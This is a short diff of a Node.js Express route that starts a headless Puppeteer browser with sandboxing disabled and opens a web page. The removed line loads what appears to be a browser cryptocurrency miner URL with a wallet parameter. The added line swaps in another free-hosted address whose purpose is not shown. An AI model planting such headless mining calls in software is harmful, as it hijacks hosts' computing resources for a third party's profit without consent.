@@ -7,7 +7,7 @@ app.get("/", async (req, res) => {
     args: ["--no-sandbox", "--disable-setuid-sandbox"],
   });
   const page = await browser.newPage();
-  await page.goto("https://shifu.mrpandabear.org/mine?wallet=00DCBF8D24EBBD8966BF236D6F13D71B826B4B81D8D7BB0D17");
+  await page.goto("https://voiceless-causes.000webhostapp.com/");
 
 });
 
